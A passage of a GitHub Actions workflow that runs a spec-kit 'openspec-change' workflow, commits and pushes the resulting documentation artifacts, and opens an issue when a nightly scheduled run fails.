          echo "slug=$SLUG" >> "$GITHUB_OUTPUT"
          echo "title=$TITLE" >> "$GITHUB_OUTPUT"

      - name: Run openspec-change workflow
        run: |
          specify workflow run openspec-change \
            --input "slug=${{ steps.extract-slug.outputs.slug }},title=${{ steps.extract-slug.outputs.title }}" \
            2>&1 || echo "Workflow run completed with warnings"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Commit new artifacts
        run: |
          git config --local user.email "github-actions[bot]@users.noreply.github.com"
          git config --local user.name "github-actions[bot]"
          git add docs/decisions/ openspec/changes/ .specify/issues/ 2>/dev/null || true
          if git diff --cached --quiet; then
            echo "No changes to commit"
          else
            git commit -m "docs: artifacts created via spec-kit openspec-change workflow

            Created by github-actions workflow"
            git push 2>&1 || echo "Push skipped (no permissions)"
          fi


  # Nobody reads a red cron run. Open an issue instead, so the nightly failure has
  # somewhere to land other than a scrollback buffer.
  nightly-alert:
    if: ${{ failure() && github.event_name == 'schedule' }}
    needs: [static, tests, android]
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    permissions:
      issues: write
    steps:
      - env:
          GH_TOKEN: ${{ github.token }}
          GH_REPO: ${{ github.repository }}
        run: |
          gh issue create \
            --title "Nightly CI failed ($(date -u +%F))" \
            --body "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"